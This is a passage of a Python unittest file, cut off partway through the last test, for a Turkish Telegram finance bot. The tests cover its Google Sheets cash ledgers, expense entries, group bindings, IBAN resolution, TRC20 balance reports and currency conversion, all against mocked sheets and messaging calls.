import sys
import json
import unittest
from unittest.mock import MagicMock, patch

# Mock third-party dependencies before importing bot
sys.modules["gspread"] = MagicMock()
sys.modules["google"] = MagicMock()
sys.modules["google.oauth2"] = MagicMock()
sys.modules["google.oauth2.service_account"] = MagicMock()

import bot

_ORIG_GET_SPREADSHEET = bot.get_spreadsheet
_ORIG_GET_ACTIVE_DAILY_SHEET = bot.get_active_daily_sheet
_ORIG_GET_SHEET_VALUES_FAST = bot.get_sheet_values_fast
_ORIG_GET_HAREM_DOLAR_KURU = bot.get_harem_dolar_kuru
_ORIG_GET_HAREM_EURO_KURU = bot.get_harem_euro_kuru
_ORIG_GET_BORSA_KURLARI = bot.get_borsa_kurlari_listesi
_ORIG_HTTP_GET_JSON = bot.http_get_json
_ORIG_FETCH_ALL_MARKET_RATES = bot.fetch_all_market_rates_parallel
_ORIG_TELEGRAM_MESAJ_DUZENLE = bot.telegramMesajDuzenle
_ORIG_TELEGRAM_MESAJ_GONDER = bot.telegramMesajGonder
_ORIG_TELEGRAM_MESAJ_SIL = bot.telegramMesajSil

class TestKasaAndGroupBinding(unittest.TestCase):
    def setUp(self):
        bot.cache_temizle_impl()
        bot._yetkisiz_uyarilanlar.clear()
        bot._idempotency_cache.clear()
        with bot._sheet_failed_writes_lock:
            bot._sheet_failed_writes.clear()
        bot.get_spreadsheet = _ORIG_GET_SPREADSHEET
        bot.get_active_daily_sheet = _ORIG_GET_ACTIVE_DAILY_SHEET
        bot.get_sheet_values_fast = _ORIG_GET_SHEET_VALUES_FAST
        bot.get_harem_dolar_kuru = _ORIG_GET_HAREM_DOLAR_KURU
        bot.get_harem_euro_kuru = _ORIG_GET_HAREM_EURO_KURU
        bot.get_borsa_kurlari_listesi = _ORIG_GET_BORSA_KURLARI
        bot.http_get_json = _ORIG_HTTP_GET_JSON
        bot.fetch_all_market_rates_parallel = _ORIG_FETCH_ALL_MARKET_RATES
        bot.telegramMesajDuzenle = _ORIG_TELEGRAM_MESAJ_DUZENLE
        bot.telegramMesajGonder = _ORIG_TELEGRAM_MESAJ_GONDER
        bot.telegramMesajSil = _ORIG_TELEGRAM_MESAJ_SIL
        bot.app_state["KISITLI_YETKILILER"] = dict(bot.KISITLI_YETKILILER)

    def test_normalize_text(self):
        self.assertEqual(bot.normalize_text("SACİD"), "SACID")
        self.assertEqual(bot.normalize_text("sacid"), "SACID")
        self.assertEqual(bot.normalize_text("  Sacid  "), "SACID")
        self.assertEqual(bot.normalize_text("TİGER"), "TIGER")
        self.assertEqual(bot.normalize_text("tiger"), "TIGER")
        self.assertEqual(bot.normalize_text("Tiger"), "TIGER")
        self.assertEqual(bot.normalize_text("Şirket Masrafı"), "SIRKETMASRAFI")

    def test_grup_emojisi_bul(self):
        self.assertEqual(bot.grupEmojisiBul("TİGER"), "🐅")
        self.assertEqual(bot.grupEmojisiBul("KAPLAN"), "🐅")
        self.assertEqual(bot.grupEmojisiBul("ASLAN KUYUMCULUK"), "🦁")
        self.assertEqual(bot.grupEmojisiBul("SACİD"), "🦅")
        self.assertEqual(bot.grupEmojisiBul("KARTAL DÖVİZ"), "🦅")
        self.assertEqual(bot.grupEmojisiBul("BSM"), "💎")
        self.assertEqual(bot.grupEmojisiBul("HSY EMLAK"), "🏢")
        self.assertEqual(bot.grupEmojisiBul("ABI"), "👑")
        self.assertEqual(bot.grupEmojisiBul("YEMEK"), "🍔")
        self.assertEqual(bot.grupEmojisiBul("ARAC YAKIT"), "🚗")
        # Custom non-keyword group should receive consistent stylish symbol
        sym1 = bot.grupEmojisiBul("ÖZEL CARİ")
        sym2 = bot.grupEmojisiBul("ÖZEL CARİ")
        self.assertEqual(sym1, sym2)
        self.assertTrue(len(sym1) >= 1)

    def test_guvenli_sayi_and_para_format(self):
        # Numbers parsing
        self.assertAlmostEqual(bot.guvenliSayi("4.731.892,00"), 4731892.00)
        self.assertAlmostEqual(bot.guvenliSayi("35648950"), 35648950.0)
        self.assertAlmostEqual(bot.guvenliSayi("-50.000,50"), -50000.50)
        self.assertAlmostEqual(bot.guvenliSayi("(1.200,00)"), -1200.00)
        self.assertAlmostEqual(bot.guvenliSayi(""), 0.0)
        self.assertAlmostEqual(bot.guvenliSayi("-"), 0.0)
        
        # Currency formatting
        self.assertEqual(bot.paraFormatla(4731892.00), "4.731.892,00 ₺")
        self.assertEqual(bot.paraFormatla(-50000.50), "-50.000,50 ₺")
        self.assertEqual(bot.paraFormatla(0), "0,00 ₺")

    def test_group_binding_cache(self):
        bot.app_state["GRUP_BAGLANTILARI"] = {-100123456789: {"grup": "SACİD", "title": "Sacid Operasyon Grubu"}}
        self.assertIn(-100123456789, bot.app_state["GRUP_BAGLANTILARI"])
        self.assertEqual(bot.app_state["GRUP_BAGLANTILARI"][-100123456789]["grup"], "SACİD")

    def test_kasa_slip_format(self):
        # Mocking a row simulation
        row = ["1", "SACİD", "4.731.892,00", "35.648.950,00", "33.103.960,00", "712.979,00", "6.563.903,00"]
        devir = bot.guvenliSayi(row[2])
        kasa = bot.guvenliSayi(row[3])
        odenen = bot.guvenliSayi(row[4])
        kom = bot.guvenliSayi(row[5])
        kalan = bot.guvenliSayi(row[6])
        
        self.assertAlmostEqual(devir, 4731892.0)
        self.assertAlmostEqual(kasa, 35648950.0)
        self.assertAlmostEqual(odenen, 33103960.0)
        self.assertAlmostEqual(kom, 712979.0)
        self.assertAlmostEqual(kalan, 6563903.0)
        
        slip = (
            f"📊 <b>[ SACİD ] GÜNCEL KASA ANALİZİ</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📅 Tarih: 17.08.2026 | ⏰ Saat: 15:49\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Önceki Devir: {bot.paraFormatla(devir)}\n"
            f"💰 Eklenen Kasa: {bot.paraFormatla(kasa)}\n"
            f"💸 Yapılan Ödeme: {bot.paraFormatla(odenen)}\n"
            f"✂️ Kesinti/Masraf: {bot.paraFormatla(kom)}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🏦 <b>NET KALAN TL: {bot.paraFormatla(kalan)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
    def test_grup_kasa_analiz_fisi_uret(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "23.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Komisyon", "Kalan"],
            ["1", "SACİD", "4.731.892,00", "35.648.950,00", "33.103.960,00", "712.979,00", "6.563.903,00"],
            ["2", "TİGER", "100.000,00", "500.000,00", "200.000,00", "10.000,00", "390.000,00"]
        ]
        mock_sh = MagicMock()
        mock_sh.worksheets.return_value = [mock_sheet]
        
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        
        # Test finding SACİD with lowercase, uppercase, Turkish chars
        res1 = bot.grup_kasa_analiz_fisi_uret("sacid")
        res1_text = res1[0] if isinstance(res1, tuple) else res1
        self.assertIn("[ SACİD ] GÜNCEL KASA ANALİZİ", res1_text)
        self.assertIn("6.563.903,00 ₺", res1_text)
        
        res2 = bot.grup_kasa_analiz_fisi_uret("TİGER")
        res2_text = res2[0] if isinstance(res2, tuple) else res2
        self.assertIn("[ TİGER ] GÜNCEL KASA ANALİZİ", res2_text)
        self.assertIn("390.000,00 ₺", res2_text)
        
        # Test non-existent group
        with self.assertRaises(ValueError):
            bot.grup_kasa_analiz_fisi_uret("BILINMEYEN")

    def test_grup_bagla_and_kopar_flow(self):
        mock_baglanti_sheet = MagicMock()
        mock_baglanti_sheet.get_all_values.return_value = [
            ["Chat ID", "Grup Adı", "Telegram Grup Başlığı", "Ekleyen ID", "Tarih"]
        ]
        
        mock_daily_sheet = MagicMock()
        mock_daily_sheet.title = "23.08.2026"
        mock_daily_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Komisyon", "Kalan"],
            ["1", "SACİD", "1000", "2000", "500", "100", "2400"]
        ]
        
        mock_sh = MagicMock()
        mock_sh.worksheet.return_value = mock_baglanti_sheet
        
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_daily_sheet)
        bot.sistemeLogYaz = MagicMock()
        
        # 1. Bind SACİD to group chat_id -100999888
        res = bot.grup_bagla_impl(-100999888, 8395730761, "/grupbagla SACİD", "Test Grubu")
        self.assertIn("Bağlantı Başarılı!", res)
        self.assertIn("SACİD", res)
        self.assertEqual(bot.app_state["GRUP_BAGLANTILARI"][-100999888]["grup"], "SACİD")
        
        # 2. List bindings
        list_res = bot.grup_baglantilari_listesi_impl()
        self.assertIn("SACİD", list_res)
        self.assertIn("-100999888", list_res)
        
        # 3. Unbind group
        mock_baglanti_sheet.get_all_values.return_value = [
            ["Chat ID", "Grup Adı", "Telegram Grup Başlığı", "Ekleyen ID", "Tarih"],
            ["-100999888", "SACİD", "Test Grubu", "8395730761", "23.08.2026 12:00"]
        ]
        kopar_res = bot.grup_kopar_impl(-100999888, 8395730761)
        self.assertIn("Grup Bağlantısı Kaldırıldı!", kopar_res)
        self.assertNotIn(-100999888, bot.app_state["GRUP_BAGLANTILARI"])

    def test_trc20_varlik_raporu(self):
        bot.get_tron_balances = MagicMock(return_value=(1286.64, 8040.45, 8482.25))
        bot.get_borsa_kurlari_listesi = MagicMock(return_value=(
            "🟡 <b>BİNANCE</b> USDT/TRY - 💵 Anlık Kur: 48,09 ₺\n"
            "🔵 <b>PARİBU</b> USDT/TRY - 💵 Anlık Kur: 48,09 ₺\n"
            "🟢 <b>BTCTÜRK</b> USDT/TRY - 💵 Anlık Kur: 48,09 ₺\n"
            "⚪ <b>WHITEBIT</b> USDT/TRY - 💵 Anlık Kur: 48,06 ₺\n"
            "⚫ <b>OKX</b> USDT/TRY - 💵 Anlık Kur: 48,04 ₺",
            48.09
        ))

        msg, klavye = bot.trc20_varlik_raporu_uret("TQHuwJh5c4ygbKhfFoGqTZTahjQuJAX3iV")
        self.assertIn("REZERV & CANLI VARLIK RAPORU", msg)
        self.assertIn("BİNANCE", msg)
        self.assertIn("PARİBU", msg)
        self.assertIn("BTCTÜRK", msg)
        self.assertIn("WHITEBIT", msg)
        self.assertIn("OKX", msg)
        self.assertIn("8.040,45 USDT", msg)
        self.assertIn("1.286,64 TRX", msg)
        self.assertIn("$8.482,25", msg)
        self.assertIn("USDT TÜRK LİRASI KARŞILIĞI", msg)
        self.assertIn("386.665,24 ₺", msg)
        self.assertIn("inline_keyboard", klavye)

        # Kurucu olmayan (yönetici olan) biri /t çalıştırırsa kurucu uyarısı almalı
        bot.app_state["EK_ADMINLER"].add(999999999)
        bot.app_state["ADMIN_CACHE_TIME"] = bot.time.time()
        bot.telegramMesajGonder = MagicMock(return_value={"ok": True})
        update_non_kurucu = {
            "message": {
                "chat": {"id": 12345, "title": "Test Group"},
                "from": {"id": 999999999},
                "text": "/t"
            }
        }
        bot.process_telegram_update(update_non_kurucu)
        last_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("sadece <b>Şirket Kurucusuna</b> aittir", last_args[1])

        # Kurucu olmayan biri t_yenile_ butonuna basarsa engellenmeli
        update_cb_non_kurucu = {
            "callback_query": {
                "id": "cb_t_1",
                "chat_instance": "ci_t",
                "from": {"id": 999999999},
                "message": {"chat": {"id": 12345}, "message_id": 888},
                "data": "t_yenile_TQHuwJh5c4ygbKhfFoGqTZTahjQuJAX3iV"
            }
        }
        bot.process_telegram_update(update_cb_non_kurucu)
        last_args = bot.telegramMesajGonder.call_args[0]
        self.assertIn("sadece <b>Şirket Kurucusuna</b> aittir", last_args[1])
        bot.app_state["EK_ADMINLER"].discard(999999999)

    def test_parse_grup_ve_tutar(self):
        g, t = bot.parse_grup_ve_tutar(["abi", "500.000"])
        self.assertEqual(g, "abi")
        self.assertEqual(t, 500000.0)

        g, t = bot.parse_grup_ve_tutar(["abi", "160.000"])
        self.assertEqual(g, "abi")
        self.assertEqual(t, 160000.0)

        g, t = bot.parse_grup_ve_tutar(["ofis", "gideri", "1.250,50"])
        self.assertEqual(g, "ofis gideri")
        self.assertEqual(t, 1250.50)

        g, t = bot.parse_grup_ve_tutar(["yemek", "150.75"])
        self.assertEqual(g, "yemek")
        self.assertEqual(t, 150.75)

        g, t = bot.parse_grup_ve_tutar(["500.000", "abi"])
        self.assertEqual(g, "abi")
        self.assertEqual(t, 500000.0)

    def test_masraf_ekle_always_writes_to_next_empty_row(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "26.08.2026"
        # Row 1: Header
        # Row 2: Col I has "ABI", Col J has "160.000"
        # Row 3: Col I is empty, Col J is empty
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Masraf Tutarı"],
            ["1", "SACİD", "1000", "2000", "500", "100", "2400", "", "ABI", "160000"],
            ["2", "TİGER", "0", "0", "0", "0", "0", "", "", ""]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.sistemeLogYaz = MagicMock()

        # Ekstra ABI 500.000 masrafı ekleniyor
        res = bot.masrafVerisiYaz_impl("/masrafekle abi 500.000", "Masraf Ekleme", 1)
        self.assertIn("Masraf Eklendi!", res)
        self.assertIn("500.000,00 ₺", res)
        self.assertIn("Satır 3", res)

        # Satır 3'ün 9. ve 10. sütunlarına yazılmış olmalı (satır 2'nin üzerine yazmamalı!)
        mock_sheet.update_cell.assert_any_call(3, 9, "ABI")
        mock_sheet.update_cell.assert_any_call(3, 10, 500000.0)

        # SON_ISLEM kontrolü
        self.assertEqual(bot.app_state["SON_ISLEM"]["satir"], 3)
        self.assertTrue(bot.app_state["SON_ISLEM"].get("is_new_masraf"))

    def test_masraf_sil_logic(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "26.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Masraf Tutarı"],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "ABI", "160000"],
            ["2", "TİGER", "0", "0", "0", "0", "0", "", "ABI", "500000"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.sistemeLogYaz = MagicMock()

        # En son satırdaki (satır 3) ABI 500.000 masrafından 200.000 düş
        res = bot.masrafVerisiYaz_impl("/masrafsil abi 200.000", "Masraf Silme", -1)
        self.assertIn("Masraf Tutarı Düşüldü!", res)
        self.assertIn("300.000,00 ₺", res)
        mock_sheet.update_cell.assert_called_with(3, 10, 300000.0)

        # Tamamını sil (satır 3'teki 500.000'i komple sil)
        res_full = bot.masrafVerisiYaz_impl("/masrafsil abi 500.000", "Masraf Silme", -1)
        self.assertIn("Masraf Satırı Silindi!", res_full)
        mock_sheet.update_cell.assert_any_call(3, 9, "")
        mock_sheet.update_cell.assert_any_call(3, 10, "")

    def test_gerial_new_masraf(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "26.08.2026"
        mock_sh = MagicMock()
        mock_sh.worksheet.return_value = mock_sheet
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.sistemeLogYaz = MagicMock()

        # Simüle edilen yeni masraf işlemi
        bot.app_state["SON_ISLEM"] = {
            "sayfa": "26.08.2026", "satir": 5, "sutun": 10,
            "eskiDeger": 0, "grupAdi": "YEMEK",
            "islemTuru": "Masraf Ekleme", "is_new_masraf": True
        }

        # gerial mantığı çalıştır
        last = bot.app_state["SON_ISLEM"]
        sayfa = mock_sh.worksheet(last["sayfa"])
        if last.get("is_new_masraf"):
            sayfa.update_cell(last["satir"], 9, "")
            sayfa.update_cell(last["satir"], 10, "")
        bot.app_state["SON_ISLEM"] = None

    def test_caching_and_threadpool(self):
        # Verify thread pools exist and are active
        self.assertIsNotNone(bot._update_executor)
        self.assertIsNotNone(bot._log_executor)

        # Verify caching logic
        mock_gc = MagicMock()
        mock_sh = MagicMock()
        mock_gc.open_by_key.return_value = mock_sh
        bot._cached_gc = mock_gc
        bot._cached_spreadsheet = None
        bot._cached_sh_time = 0

        # First call opens spreadsheet
        sh1 = bot.get_spreadsheet()
        self.assertEqual(sh1, mock_sh)
        mock_gc.open_by_key.assert_called_once_with(bot.SPREADSHEET_ID)

        # Second call returns cached without re-opening
        mock_gc.open_by_key.reset_mock()
    def test_dynamic_rehber(self):
        # Verify main guide and keyboards
        ana_metin = bot.rehber_ana_metni()
        self.assertIn("CFO BOT AKILLI KOMUT REHBERİ", ana_metin)
        
        ana_klavye = bot.rehber_ana_klavyesi()
        self.assertIn("inline_keyboard", ana_klavye)
        self.assertTrue(len(ana_klavye["inline_keyboard"]) >= 4)

    def test_gun_sonu_kapanis_raporu(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "26.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Masraf Tutarı"],
            ["1", "SACİD", "100.000,00", "500.000,00", "300.000,00", "10.000,00", "290.000,00", "", "YEMEK", "1500"],
            ["2", "TİGER", "50.000,00", "200.000,00", "100.000,00", "5.000,00", "145.000,00", "", "OFİS", "2500"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)

        rapor = bot.gun_sonu_kapanis_raporu_uret()
        self.assertIn("GÜN SONU FİNANS VE KASA BİLANÇOSU", rapor)
        self.assertIn("SACİD", rapor)
        self.assertIn("TİGER", rapor)
        self.assertIn("YEMEK", rapor)
        self.assertIn("OFİS", rapor)
        self.assertIn("4.000,00 ₺", rapor)  # Toplam masraf (1500 + 2500)
        self.assertIn("435.000,00 ₺", rapor) # Net kalan (290000 + 145000)

    def test_yenigun_g45_formula_transfer(self):
        # Create a mock source sheet with 45 rows
        mock_source = MagicMock()
        mock_source.title = "26.08.2026"
        mock_source.col_count = 10
        mock_source.row_count = 50
        
        # Build 45 rows of data
        source_data = [["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf", "Tutar"]]
        for idx in range(1, 42):
            source_data.append([str(idx), f"GRUP_{idx}", "1000", "5000", "2000", "100", "3900", "", "", ""])
        source_data.append(["42", "GENEL TOPLAM", "41000", "205000", "82000", "4100", "159900", "", "", ""])
        source_data.append(["43", "FARK", "", "", "", "", "", "", "", ""])
        # Row 45 (index 44 in 0-based): Column G (index 6) has evaluated "7.697.794,20"
        source_data.append(["44", "", "2.175.000,00", "", "", "", "7.697.794,20", "", "", ""])
        
        mock_source.get_all_values.return_value = source_data
        
        mock_new_sheet = MagicMock()
        mock_new_sheet.title = "27.08.2026"
        mock_new_sheet.col_count = 10
        mock_new_sheet.row_count = 50
        mock_source.duplicate.return_value = mock_new_sheet
        
        mock_sh = MagicMock()
        # When checking if 27.08.2026 exists, raise Exception so it proceeds
        mock_sh.worksheet.side_effect = Exception("WorksheetNotFound")
        
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_source)
        bot.sistemeLogYaz = MagicMock()
        
        # Run yenigun
        res = bot.yenigun_gerceklestir_impl(masraflari_sil=True)
        self.assertIn("27.08.2026 GÜNÜ BAŞARIYLA AÇILDI!", res)
        self.assertIn("G45 Kalan Fark:", res)
        self.assertIn("=7697794,2+F43-J43", res)
        
        # Verify G45 was updated on mock_new_sheet with formula
        mock_new_sheet.update.assert_any_call('G45', [['=7697794,2+F43-J43']], value_input_option='USER_ENTERED')

    def test_yenigun_g45_negative_val(self):
        mock_source = MagicMock()
        mock_source.title = "26.08.2026"
        mock_source.col_count = 10
        mock_source.row_count = 50
        
        source_data = [["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf", "Tutar"]]
        for idx in range(1, 44):
            source_data.append([str(idx), f"GRUP_{idx}", "0", "0", "0", "0", "0", "", "", ""])
        # Row 45: Negative value "-2.175.000,50"
        source_data.append(["44", "", "0,00", "", "", "", "-2.175.000,50", "", "", ""])
        mock_source.get_all_values.return_value = source_data
        
        mock_new_sheet = MagicMock()
        mock_new_sheet.col_count = 10
        mock_new_sheet.row_count = 50
        mock_source.duplicate.return_value = mock_new_sheet
        
        mock_sh = MagicMock()
        mock_sh.worksheet.side_effect = Exception("WorksheetNotFound")
        
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_source)
        bot.sistemeLogYaz = MagicMock()
        
        res = bot.yenigun_gerceklestir_impl(masraflari_sil=False)
        self.assertIn("=-2175000,5+F43-J43", res)
        mock_new_sheet.update.assert_any_call('G45', [['=-2175000,5+F43-J43']], value_input_option='USER_ENTERED')

    def test_yenigun_g45_user_exact_case(self):
        # Test exact user case: 6979160.83 -> =6979160,83+F43-J43
        mock_source = MagicMock()
        mock_source.title = "26.08.2026"
        mock_source.col_count = 10
        mock_source.row_count = 50
        
        source_data = [["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf", "Tutar"]]
        for idx in range(1, 44):
            source_data.append([str(idx), f"GRUP_{idx}", "0", "0", "0", "0", "0", "", "", ""])
        source_data.append(["44", "", "0,00", "", "", "", "6.979.160,83", "", "", ""])
        mock_source.get_all_values.return_value = source_data
        
        mock_new_sheet = MagicMock()
        mock_new_sheet.col_count = 10
        mock_new_sheet.row_count = 50
        mock_source.duplicate.return_value = mock_new_sheet
        
        mock_sh = MagicMock()
        mock_sh.worksheet.side_effect = Exception("WorksheetNotFound")
        
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_source)
        bot.sistemeLogYaz = MagicMock()
        
        res = bot.yenigun_gerceklestir_impl(masraflari_sil=False)
        self.assertIn("=6979160,83+F43-J43", res)
        mock_new_sheet.update.assert_any_call('G45', [['=6979160,83+F43-J43']], value_input_option='USER_ENTERED')

    def test_validate_iban_and_resolve(self):
        # Valid test IBAN for Garanti BBVA (Bank code: 00062)
        # TR12 0006 2000 0001 2345 6789 01 - let us check MOD-97
        test_valid_garanti = "TR120006200000012345678901"
        is_valid = bot.validate_iban(test_valid_garanti)
        
        # Test resolver formatting
        mock_sheet = MagicMock()
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "", "", "", "CYL 1", "", "", ""],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "TR120006200000012345678901", "", "", "SACİD"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        
        res = bot.ibanCozumle_impl(f"/ibancoz {test_valid_garanti}")
        self.assertIn("İBAN ÇÖZÜMLEME & DOĞRULAMA", res)
        self.assertIn("Garanti BBVA", res)
        self.assertIn("00062", res)
        self.assertIn("TR12 0006 2000 0001 2345 6789 01", res)
        self.assertIn("TR120006200000012345678901", res)
        self.assertIn("ŞİRKET İÇİ HESAP", res)
        self.assertIn("SACİD", res)

    def test_iban_tahsis_and_bosalt(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "29.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "", "", "", "Hesap 1", "", "", "Cari 1", "Hesap 2", "", "Cari 2"],
            ["1", "SACİD", "0", "0", "0", "0", "0", "", "", "", "", "CYL 1 / 72", "VKFK", "TR120006200000012345678901", "", "ARS EMLAK 1", "ZRAAT", "BSM"]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.sistemeLogYaz = MagicMock()

        # Test Tahsis
        res_tahsis = bot.iban_tahsis_impl("/ibantahsis CYL1 SACİD")
        self.assertIn("İBAN BAŞARIYLA TAHSİS EDİLDİ", res_tahsis)
        self.assertIn("SACİD", res_tahsis)
        mock_sheet.update_cell.assert_any_call(2, 15, "SACİD")

        # Test Boşalt
        res_bosalt = bot.iban_bosalt_impl("/ibanbosalt CYL1")
        self.assertIn("İBAN BOŞA ÇIKARILDI", res_bosalt)
        mock_sheet.update_cell.assert_any_call(2, 15, "")

    def test_cari_ekstre(self):
        # Create mock worksheets for 3 dates
        ws1 = MagicMock()
        ws1.title = "28.08.2026"
        ws1.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "805.121,12", "0,00", "0,00", "0,00", "805.121,12"]
        ]
        
        ws2 = MagicMock()
        ws2.title = "27.08.2026"
        ws2.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan"],
            ["1", "SACİD", "0,00", "19.333.752,00", "0,00", "386.675,04", "18.947.076,96"]
        ]

        mock_sh = MagicMock()
        mock_sh.worksheets.return_value = [ws1, ws2]
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.is_valid_daily_sheet = MagicMock(return_value=True)

        res_ekstre = bot.cari_ekstre_impl("/ekstre SACİD")
        self.assertIn("HESAP EKSTRESİ", res_ekstre)
        self.assertIn("SACİD", res_ekstre)
        self.assertIn("28.08.2026", res_ekstre)
        self.assertIn("27.08.2026", res_ekstre)
        self.assertIn("TOPLAM PERFORMANS", res_ekstre)

    def test_debug_sistem(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "29.08.2026"
        mock_sh = MagicMock()
        mock_sh.worksheets.return_value = [mock_sheet]
        
        bot.telegram_api = MagicMock(return_value={"ok": True, "result": {"id": 12345}})
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)

        res_debug = bot.debug_sistem_impl()
        self.assertIn("DEBUG RAPORU", res_debug)
        self.assertIn("GECİKME VE PING TESTİ", res_debug)
        self.assertIn("29.08.2026", res_debug)
        self.assertIn("Telegram Bot API", res_debug)
        self.assertIn("Google Sheets API", res_debug)

    def test_toplu_islem(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "29.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Tutar"],
            ["1", "SACİD", "100.000,00", "0,00", "0,00", "0,00", "100.000,00", "", "", ""],
            ["2", "TİGER", "50.000,00", "0,00", "0,00", "0,00", "50.000,00", "", "", ""]
        ]
        mock_sh = MagicMock()
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)
        bot.get_active_daily_sheet = MagicMock(return_value=mock_sheet)
        bot.sistemeLogYaz = MagicMock()

        komut = "/toplu\n+ SACİD 50000\n- SACİD 20000\n+ TİGER 150000\nM Yemek 1250"
        res_toplu = bot.toplu_islem_impl(komut)
        self.assertIn("TOPLU İŞLEM RAPORU", res_toplu)
        self.assertIn("SACİD", res_toplu)
        self.assertIn("TİGER", res_toplu)
        self.assertIn("Yemek", res_toplu)
        self.assertIn("İşlenen Kalem", res_toplu)

    def test_gecmis_gun_sorgula(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "25.08.2026"
        mock_sheet.get_all_values.return_value = [
            ["No", "Grup", "Devir", "Kasa", "Odenen", "Kom", "Kalan", "", "Masraf Kalemi", "Tutar"],
            ["1", "SACİD", "0,00", "19.333.752,00", "0,00", "386.675,04", "18.947.076,96", "", "Yemek", "1.250,00"]
        ]
        mock_sh = MagicMock()
        mock_sh.worksheet.return_value = mock_sheet
        bot.get_spreadsheet = MagicMock(return_value=mock_sh)

        # 1. Tüm gün
        res_gun = bot.gecmis_gun_sorgula_impl("/tarih 25.08.2026")
        self.assertIn("GEÇMİŞ GÜN BİLANÇOSU", res_gun)
        self.assertIn("25.08.2026", res_gun)
        self.assertIn("SACİD", res_gun)

        # 2. Tek cari
        res_cari = bot.gecmis_gun_sorgula_impl("/tarih 25.08.2026 SACİD")
        self.assertIn("GEÇMİŞ GÜN CARİ FİŞİ", res_cari)
        self.assertIn("SACİD", res_cari)
        self.assertIn("18.947.076,96", res_cari)

    def test_arbitraj_raporu(self):
        bot.get_harem_dolar_kuru = MagicMock(return_value=(48.15, 48.25))
        res_arb = bot.arbitraj_raporu_uret_impl("/arbitraj 100000")
        self.assertIn("CANLI ARBİTRAJ & MAKAS ANALİZİ", res_arb)
        self.assertIn("Kapalıçarşı USD", res_arb)
        self.assertIn("ARBİTRAJ ROTALARI", res_arb)
        self.assertIn("100.000 $", res_arb)

    def test_doviz_cevirici(self):
        bot.get_harem_dolar_kuru = MagicMock(return_value=(48.15, 48.25))
        bot.get_harem_euro_kuru = MagicMock(return_value=(52.30, 52.45))
        
        # 1. USD
        res_usd = bot.doviz_cevirici_impl("/doviz 100000 USD")
        self.assertIn("DÖVİZ DÖNÜŞÜM RAPORU", res_usd)
        self.assertIn("100,000.00 USD", res_usd)
        self.assertIn("Kapalıçarşı", res_usd)
        
        # 2. EUR
        res_eur = bot.doviz_cevirici_impl("/doviz 50000 EUR")
        self.assertIn("50,000.00 EUR", res_eur)
        
        # 3. TL
        res_tl = bot.doviz_cevirici_impl("/doviz 2500000 TL")
        self.assertIn("2.500.000,00 ₺", res_tl)

    def test_sirket_portfoy(self):
        mock_sheet = MagicMock()
        mock_sheet.title = "30.08.2026"
        mock_sheet.get_all_values.return_value = [
